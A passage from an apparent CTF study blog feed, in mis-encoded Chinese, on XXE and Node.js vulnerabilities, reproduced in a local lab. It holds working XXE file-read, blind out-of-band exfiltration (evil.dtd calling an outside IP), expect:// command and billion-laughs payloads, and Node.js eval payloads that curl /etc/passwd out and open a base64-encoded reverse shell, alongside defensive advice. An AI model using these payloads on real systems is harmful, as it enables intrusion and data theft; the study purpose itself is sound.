&quot;file:///E:/phpstudy_pro/WWW/flag.txt&quot;&gt;]&gt;&lt;xml&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&lt;/xml&gt;</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422003257935.png" alt="image-20220422003257935"></p><p>æˆåŠŸè¯»å–äº†æˆ‘eç›˜çš„æ–‡ä»¶</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422003239790.png" alt="image-20220422003239790"></p><p><strong>XXEå¸¸è§åˆ©ç”¨æ–¹å¼</strong></p><p>ä¸SQLç›¸ä¼¼ï¼ŒXXEæ¼æ´ä¹Ÿåˆ†ä¸ºæœ‰å›æ˜¾å’Œæ— å›æ˜¾<br> æœ‰å›æ˜¾ï¼Œå¯ä»¥ç›´æ¥åœ¨é¡µé¢ä¸­çœ‹åˆ°payloadçš„æ‰§è¡Œç»“æœæˆ–ç°è±¡ã€‚<br> æ— å›æ˜¾ï¼Œåˆç§°ä¸ºblind xxeï¼Œå¯ä»¥ä½¿ç”¨å¤–å¸¦æ•°æ®(OOB)é€šé“æå–æ•°æ®ã€‚å³å¯ä»¥å¼•ç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„XMLæ–‡ä»¶è¯»å–æ–‡ä»¶ã€‚</p><h2 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a><strong>ä»»æ„æ–‡ä»¶è¯»å–</strong></h2><p><strong>æˆ‘ä»¬åœ¨è¿™é‡Œé‡‡ç”¨ä¸€ä¸ªé¶åœºæ¥åˆ†æ</strong></p><p><a href="https://github.com/c0ny1/xxe-lab">xxe-lab</a></p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422004849510.png" alt="image-20220422004849510" style="zoom:67%;"><p>é¶åœºæºç :</p><pre><code class="php">&lt;?php$USERNAME = &#39;admin&#39;; //è´¦å·$PASSWORD = &#39;admin&#39;; //å¯†ç $result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#39;php://input&#39;);try&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $username = $creds-&gt;username;    $password = $creds-&gt;password;    if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);    &#125;else&#123;        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);    &#125;   &#125;catch(Exception $e)&#123;    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#39;Content-Type: text/html; charset=utf-8&#39;);echo $result;?&gt;</code></pre><p><strong>æœ‰å›æ˜¾</strong></p><p>payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE hack [&lt;!ENTITY file SYSTEM  &quot;file:///E:/phpstudy_pro/WWW/flag.txt&quot;&gt;]&gt;&lt;user&gt;  &lt;username&gt;&amp;file;&lt;/username&gt;  &lt;password&gt;hack&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422005656974.png" alt="image-20220422005656974"></p><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>php://filter</code>åè®®è¯»å–qwzf.txtæ–‡ä»¶å†…å®¹(ä¹Ÿå¯ä»¥è¯»å–å…¶ä»–ç±»å‹çš„æ–‡ä»¶ï¼Œå¦‚ï¼šphpæ–‡ä»¶)</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422005948762.png" alt="image-20220422005948762"></p><p><strong>æ— å›æ˜¾</strong></p><p>æ— å›æ˜¾çš„è¯ï¼Œå°±ä¼šéº»çƒ¦è®¸å¤š</p><p>æˆ‘ä»¬å…ˆä¿®æ”¹æºç ï¼Œç¦æ‰è¾“å‡ºä»£ç å’ŒæŠ¥é”™ä¿¡æ¯ï¼Œæ”¹æˆæ— å›æ˜¾ã€‚</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422010158422.png" alt="image-20220422010158422"></p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422010234624.png" alt="image-20220422010234624"></p><p>é‡åˆ°æ— å›æ˜¾ï¼Œå¯ä»¥é€šè¿‡<code>Blind XXE</code>æ–¹æ³•åŠ ä¸Šå¤–å¸¦æ•°æ®é€šé“æ¥æå–æ•°æ®ï¼Œå…ˆä½¿ç”¨<code>php://filter</code>åè®®è·å–ç›®æ ‡æ–‡ä»¶çš„å†…å®¹ï¼Œç„¶åå°†å†…å®¹ä»¥<code>http</code>è¯·æ±‚å‘é€åˆ°æ”»å‡»æœåŠ¡å™¨æ¥è¯»å–æ•°æ®ã€‚è™½æ— æ³•ç›´æ¥æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ˜“å—æ”»å‡»çš„æœåŠ¡å™¨ä½œä¸ºä»£ç†ï¼Œåœ¨å¤–éƒ¨ç½‘ç»œä¸Šæ‰§è¡Œæ‰«æä»¥åŠä»£ç ã€‚å³ï¼Œå½“æ— å›æ˜¾æƒ…å†µæ—¶ï¼Œå¯ä»¥å°†æ•°æ®å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨(æ”»å‡»æœåŠ¡å™¨)ã€‚</p><p>è¿™é‡Œæˆ‘çš„æœåŠ¡å™¨ipä¸º:39.105.71.63</p><p>æ„é€ payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=E:/phpstudy_pro/WWW/flag.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://39.105.71.63:66/evil.dtd&quot;&gt;%dtd;%send;]&gt;</code></pre><p>è¿œç¨‹æœåŠ¡å™¨éƒ¨ç½²evil.dtdå†…å®¹ä¸º:</p><pre><code class="xml">&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25;   send SYSTEM &#39;http://39.105.71.63:66/?%file;&#39;&gt;&quot;&gt;%all;</code></pre><p>å†…éƒ¨çš„%å·è¦è¿›è¡Œå®ä½“ç¼–ç æˆ<code>&amp;#x25</code></p><p>æˆ‘ä»¬ç›´æ¥æŠŠè¿™ä¸ªæ–‡ä»¶æ”¾åˆ°ä¸€ä¸ªç½‘ç«™ä¸Šï¼Œæˆ‘è¿™é‡Œå°±ç›´æ¥åˆ©ç”¨å®å¡”å’¯(æˆ‘æ˜¯æ‡’ç‹—)</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422021836512.png" alt="image-20220422021836512"></p><p>ç„¶åå‘æˆ‘ä»¬æœ¬åœ°çš„é¶æœºå‘é€payload</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220422021925811.png" alt="image-20220422021925811"></p><p>æˆåŠŸå›æ˜¾å‡ºäº†æ–‡ä»¶</p><p><em>æ— å›æ˜¾æ”»å‡»æµç¨‹ï¼š</em></p><ul><li>å…ˆè°ƒç”¨<code>%dtd</code>ï¼Œè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨(æ”»å‡»æœåŠ¡å™¨)ä¸Šçš„<code>evil.dtd</code>ã€‚</li><li>å†è°ƒç”¨ <code>evil.dtd</code>ä¸­çš„ <code>%file</code>ã€‚<code>%file</code> è·å–å—æ”»å‡»çš„æœåŠ¡å™¨ä¸Šé¢çš„æ•æ„Ÿæ–‡ä»¶ï¼Œç„¶åå°† <code>%file</code> çš„è¿”å›ç»“æœä¼ åˆ°<code>%send</code> ã€‚</li><li>ç„¶åè°ƒç”¨ <code>%send;</code> æŠŠè¯»å–åˆ°çš„æ•°æ®å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šã€‚</li></ul><p>è¿™æ ·å°±å®ç°äº†å¤–å¸¦æ•°æ®çš„æ•ˆæœï¼Œè§£å†³ XXE æ— å›æ˜¾çš„é—®é¢˜ã€‚</p><h2 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a><strong>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</strong></h2><p>åœ¨å®‰è£…expectæ‰©å±•çš„PHPç¯å¢ƒé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä»–åè®®ä¹Ÿæœ‰å¯èƒ½å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p>é€šè¿‡XXEå¯ä»¥å®ç°RCEçš„å®ä¾‹å¾ˆå°‘ã€‚</p><h2 id="æ‹’ç»æœåŠ¡æ”»å‡»-DDOS"><a href="#æ‹’ç»æœåŠ¡æ”»å‡»-DDOS" class="headerlink" title="æ‹’ç»æœåŠ¡æ”»å‡»(DDOS)"></a><strong>æ‹’ç»æœåŠ¡æ”»å‡»(DDOS)</strong></h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;   &lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt;&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><p><strong>åŸç†</strong>ï¼šé€’å½’å¼•ç”¨,lol å®ä½“å…·ä½“è¿˜æœ‰ â€œlolâ€ å­—ç¬¦ä¸²ï¼Œç„¶åä¸€ä¸ª lol2 å®ä½“å¼•ç”¨äº† 10 æ¬¡ lol  å®ä½“ï¼Œä¸€ä¸ª lol3 å®ä½“å¼•ç”¨äº† 10 æ¬¡ lol2 å®ä½“ï¼Œæ­¤æ—¶ä¸€ä¸ª lol3 å®ä½“å°±å«æœ‰ 10^2 ä¸ª â€œlolâ€ äº†ï¼Œä»¥æ­¤ç±»æ¨ï¼Œlol9  å®ä½“å«æœ‰ 10^8 ä¸ª â€œlolâ€ å­—ç¬¦ä¸²,æœ€åå†å¼•ç”¨lol9ã€‚</p><h2 id="æ¢æµ‹å†…ç½‘ç«¯å£ä¸æ¢æµ‹å†…ç½‘ç½‘ç«™"><a href="#æ¢æµ‹å†…ç½‘ç«¯å£ä¸æ¢æµ‹å†…ç½‘ç½‘ç«™" class="headerlink" title="æ¢æµ‹å†…ç½‘ç«¯å£ä¸æ¢æµ‹å†…ç½‘ç½‘ç«™"></a><strong>æ¢æµ‹å†…ç½‘ç«¯å£ä¸æ¢æµ‹å†…ç½‘ç½‘ç«™</strong></h2><p>è¿™ä¸ªæˆ‘æ²¡å¤ç°æˆåŠŸã€‚ã€‚ã€‚å…ˆæ‹¿åˆ«äººçš„å§</p><p>æ¼æ´ä»£ç :</p><p>test.php</p><pre><code class="php">&lt;?php$xml = simplexml_load_string($_REQUEST[&#39;xml&#39;]);print_r($xml);//æ³¨é‡Šæ‰è¯¥è¯­å¥å³ä¸ºæ— å›æ˜¾çš„æƒ…å†µ?&gt;</code></pre><p>æ¢æµ‹å†…ç½‘ç«¯å£</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><p>3306ç«¯å£å¼€æ”¾<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20191202152107-4ea0fe60-14d4-1.jpg"><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202152107-4ea0fe60-14d4-1.jpg" alt="img"></a><br> 3389ç«¯å£æœªå¼€æ”¾<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20191202152125-5979dc4e-14d4-1.jpg"><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202152125-5979dc4e-14d4-1.jpg" alt="img"></a></p><h2 id="æ”»å‡»å†…ç½‘ç½‘ç«™"><a href="#æ”»å‡»å†…ç½‘ç½‘ç«™" class="headerlink" title="æ”»å‡»å†…ç½‘ç½‘ç«™"></a><strong>æ”»å‡»å†…ç½‘ç½‘ç«™</strong></h2><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/payload&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><h2 id="XXEæ¼æ´é˜²å¾¡"><a href="#XXEæ¼æ´é˜²å¾¡" class="headerlink" title="XXEæ¼æ´é˜²å¾¡"></a><strong>XXEæ¼æ´é˜²å¾¡</strong></h2><p><strong>1ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•</strong><br> php:</p><pre><code class="php">libxml_disable_entity_loader(true);</code></pre><p>java:</p><pre><code class="java">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</code></pre><p>Python:</p><pre><code class="python">from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><p><strong>2ã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®</strong><br> è¿‡æ»¤å…³é”®å­—ï¼š<code>&lt;\!DOCTYPE</code>å’Œ<code>&lt;\!ENTITY</code>ï¼Œæˆ–è€…<code>SYSTEM</code>å’Œ<code>PUBLIC</code>ã€‚<br> <strong>3ã€ä¸å…è®¸XMLä¸­å«æœ‰è‡ªå·±å®šä¹‰çš„DTD</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è‡ªå·±å¯¹è¿™ä¸ªæ¼æ´ä¸æ‡‚åŸç†ï¼Œä»¥åŠä¸ä¼šæ·±å…¥åˆ©ç”¨ï¼Œå°±çœ‹çœ‹å¸ˆå‚…çš„æ–‡ç« ï¼Œæ¬è¿é¡ºä¾¿å¤ç°éƒ¨åˆ†åœºæ™¯å§ã€‚&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;XML&quot;&gt;&lt;a href=&quot;#XML&quot; class=&quot;headerlink&quot; title=&quot;XML&quot;&gt;&lt;/a&gt;XML&lt;/h1&gt;&lt;p&gt;&lt;st</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="å¸¸è§æ¼æ´å’Œæ‰‹æ³•" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="XXE" scheme="https://sakurahack-y.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>node.jså¸¸è§æ¼æ´å­¦ä¹ </title>
    <link href="https://sakurahack-y.github.io/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://sakurahack-y.github.io/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-04-15T15:19:35.000Z</published>
    <updated>2022-04-15T17:16:02.344Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="å±é™©å‡½æ•°æ‰€å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ"><a href="#å±é™©å‡½æ•°æ‰€å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å±é™©å‡½æ•°æ‰€å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ"></a>å±é™©å‡½æ•°æ‰€å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>eval() å‡½æ•°å¯è®¡ç®—æŸä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„çš„ JavaScript ä»£ç ã€‚å’ŒPHPä¸­evalå‡½æ•°ä¸€æ ·ï¼Œå¦‚æœä¼ é€’åˆ°å‡½æ•°ä¸­çš„å‚æ•°å¯æ§å¹¶ä¸”æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤æ—¶ï¼Œå°±ä¼šå¯¼è‡´æ¼æ´çš„å‡ºç°ã€‚</p><p>ç®€å•ä¾‹å­:</p><pre><code class="javascript">var express = require(&quot;express&quot;);var app = express();app.get(&#39;/eval&#39;,function(req,res)&#123;res.send(eval(req.query.q));console.log(req.query.q);&#125;)var server = app.listen(8888, function() &#123;console.log(&quot;åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://127.0.0.1:8888/&quot;);&#125;)</code></pre><p><strong>æ¼æ´åˆ©ç”¨</strong></p><p>node.js.jsä¸­çš„chile_process.execè°ƒç”¨çš„æ˜¯/bash.shï¼Œå®ƒæ˜¯ä¸€ä¸ªbashè§£é‡Šå™¨ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚åœ¨evalå‡½æ•°çš„å‚æ•°ä¸­å¯ä»¥æ„é€ <code>require(&#39;child_process&#39;).exec(&#39;&#39;);</code>æ¥è¿›è¡Œè°ƒç”¨ã€‚</p><p>å¼¹è®¡ç®—å™¨(windows):</p><pre><code class="javascript">/eval?q=require(&#39;child_process&#39;).exec(&#39;calc&#39;);</code></pre><p>è¯»å–æ–‡ä»¶(linux)ï¼š</p><pre><code class="javascript">/eval?q=require(&#39;child_process&#39;).exec(&#39;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&#39;);;</code></pre><p>åå¼¹shell(linux)ï¼š</p><pre><code class="javascript">/eval?q=require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash&#39;);# mFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYxæ˜¯bash -i &gt;&amp; /dev/tcp/127.0.0.1/3333 0&gt;&amp;1 BASE64åŠ å¯†åçš„ç»“æœï¼Œç›´æ¥è°ƒç”¨ä¼šæŠ¥é”™ã€‚æ³¨æ„ï¼šBASE64åŠ å¯†åçš„å­—ç¬¦ä¸­æœ‰ä¸€ä¸ª+å·éœ€è¦urlç¼–ç ä¸º%2B(ä¸€å®šæƒ…å†µä¸‹)å¦‚æœä¸Šä¸‹æ–‡ä¸­æ²¡æœ‰require,åˆ™å¯ä»¥ä½¿ç”¨global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)æ¥æ‰§è¡Œå‘½ä»¤</code></pre><h2 id="ç±»ä¼¼å‘½ä»¤"><a href="#ç±»ä¼¼å‘½ä»¤" class="headerlink" title="ç±»ä¼¼å‘½ä»¤"></a>ç±»ä¼¼å‘½ä»¤</h2><ol><li><p>é—´éš”ä¸¤ç§’æ‰§è¡Œå‡½æ•°</p><pre><code>setInteval(some_function, 2000)</code></pre></li><li><p>ä¸¤ç§’åæ‰§è¡Œå‡½æ•°ï¼š</p><pre><code>setTimeout(some_function, 2000);</code></pre></li><li><p>some_functionå¤„å°±ç±»ä¼¼äºevalå‡½æ•°çš„å‚æ•°</p><pre><code>è¾“å‡ºHelloWorldï¼š    Function(â€œconsole.log(â€˜HelloWolrdâ€™)â€)()ç±»ä¼¼äºphpä¸­çš„create_function</code></pre></li></ol><h1 id="Node-js-åŸå‹æ±¡æŸ“æ¼æ´"><a href="#Node-js-åŸå‹æ±¡æŸ“æ¼æ´" class="headerlink" title="Node.js åŸå‹æ±¡æŸ“æ¼æ´"></a>Node.js åŸå‹æ±¡æŸ“æ¼æ´</h1><h2 id="å…³äºåŸå‹é“¾"><a href="#å…³äºåŸå‹é“¾" class="headerlink" title="å…³äºåŸå‹é“¾"></a>å…³äºåŸå‹é“¾</h2><p>JavascriptåŸå‹é“¾å‚è€ƒæ–‡ç« ï¼š<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">ç»§æ‰¿ä¸åŸå‹é“¾</a></p><p>æ–‡ç« å†…å…³äºåŸå‹å’ŒåŸå‹é“¾çš„çŸ¥è¯†å†™çš„éå¸¸è¯¦ç»†ï¼Œå°±ä¸å†æ€»ç»“æ•´ä¸ªè¿‡ç¨‹äº†ï¼Œä»¥ä¸‹ä¸ºå‡ ä¸ªæ¯”è¾ƒé‡è¦çš„ç‚¹ï¼š</p><p>1.åœ¨javascriptï¼Œæ¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªprototypeå±æ€§ï¼Œprototype å±æ€§å¯ä»¥å‘å¯¹è±¡æ·»åŠ å±æ€§å’Œæ–¹æ³•ã€‚</p><pre><code>object.prototype.name=value</code></pre><p>2.åœ¨javascriptï¼Œæ¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª<code>__proto__</code>å±æ€§ï¼Œè¿™ä¸ªå®ä¾‹å±æ€§æŒ‡å‘å¯¹è±¡çš„åŸå‹å¯¹è±¡(å³åŸå‹)ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è®¿é—®å¾—åˆ°æŸä¸€å®ä¾‹å¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼š</p><pre><code>objectname[&quot;__proto__&quot;]objectname.__proto__objectname.constructor.prototype</code></pre><p>3.ä¸åŒå¯¹è±¡æ‰€ç”Ÿæˆçš„åŸå‹é“¾å¦‚ä¸‹(éƒ¨åˆ†)ï¼š</p><pre><code>var o = &#123;a: 1&#125;;// oå¯¹è±¡ç›´æ¥ç»§æ‰¿äº†Object.prototype// åŸå‹é“¾ï¼š// o ---&gt; Object.prototype ---&gt; nullvar a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];// æ•°ç»„éƒ½ç»§æ‰¿äº Array.prototype// åŸå‹é“¾ï¼š// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; nullfunction f()&#123;return 2;&#125;// å‡½æ•°éƒ½ç»§æ‰¿äº Function.prototype// åŸå‹é“¾ï¼š// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</code></pre><h2 id="åŸå‹é“¾æ±¡æŸ“åŸç†"><a href="#åŸå‹é“¾æ±¡æŸ“åŸç†" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“åŸç†"></a>åŸå‹é“¾æ±¡æŸ“åŸç†</h2><p>å¯¹äºè¯­å¥ï¼š<code>object[a][b] = value</code> å¦‚æœå¯ä»¥æ§åˆ¶aã€bã€valueçš„å€¼ï¼Œå°†aè®¾ç½®ä¸º<code>__proto__</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»™objectå¯¹è±¡çš„åŸå‹è®¾ç½®ä¸€ä¸ªbå±æ€§ï¼Œå€¼ä¸ºvalueã€‚è¿™æ ·æ‰€æœ‰ç»§æ‰¿objectå¯¹è±¡åŸå‹çš„å®ä¾‹å¯¹è±¡åœ¨æœ¬èº«ä¸æ‹¥æœ‰bå±æ€§çš„æƒ…å†µä¸‹ï¼Œéƒ½ä¼šæ‹¥æœ‰bå±æ€§ï¼Œä¸”å€¼ä¸ºvalueã€‚</p><p>æ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­:</p><pre><code>object1 = &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;object1.__proto__.foo = &quot;Hello World&quot;;console.log(object1.foo);object2 = &#123;&quot;c&quot;:1, &quot;d&quot;:2&#125;;console.log(object2.foo);</code></pre><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416000347433.png" alt="image-20220416000347433"></p><p>æœ€ç»ˆè¾“å‡ºäº†ä¸¤ä¸ªhello word</p><p>ä¸ºä»€ä¹ˆobject2åœ¨æ²¡æœ‰è®¾ç½®fooå±æ€§çš„æƒ…å†µä¸‹ï¼Œä¹Ÿä¼šè¾“å‡ºHello  Worldå‘¢ï¼Ÿå°±æ˜¯å› ä¸ºåœ¨ç¬¬äºŒæ¡è¯­å¥ä¸­ï¼Œæˆ‘ä»¬å¯¹object1çš„åŸå‹å¯¹è±¡è®¾ç½®äº†ä¸€ä¸ªfooå±æ€§ï¼Œè€Œobject2å’Œobject1ä¸€æ ·ï¼Œéƒ½æ˜¯ç»§æ‰¿äº†Object.prototypeã€‚åœ¨è·å–object2.fooæ—¶ï¼Œç”±äºobject2æœ¬èº«ä¸å­˜åœ¨fooå±æ€§ï¼Œå°±ä¼šå¾€çˆ¶ç±»Object.prototypeä¸­å»å¯»æ‰¾ã€‚è¿™å°±é€ æˆäº†ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œæ‰€ä»¥åŸå‹é“¾æ±¡æŸ“ç®€å•æ¥è¯´å°±æ˜¯å¦‚æœèƒ½å¤Ÿæ§åˆ¶å¹¶ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œå°±å¯ä»¥å½±å“åˆ°æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡åŒä¸€ä¸ªåŸå‹çš„å¯¹è±¡ã€‚</p><h2 id="mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“"><a href="#mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“"></a>mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“</h2><p>mergeæ“ä½œæ˜¯æœ€å¸¸è§å¯èƒ½æ§åˆ¶é”®åçš„æ“ä½œï¼Œä¹Ÿæœ€èƒ½è¢«åŸå‹é“¾æ”»å‡»ã€‚</p><p>ä¾‹å­:</p><pre><code class="javascript">function merge(target, source) &#123;for (let key in source) &#123;if (key in source &amp;&amp; key in target) &#123;merge(target[key], source[key])&#125; else &#123;target[key] = source[key]&#125;&#125;&#125;let object1 = &#123;&#125;let object2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)merge(object1, object2)console.log(object1.a, object1.b)object3 = &#123;&#125;console.log(object3.b)# merge() 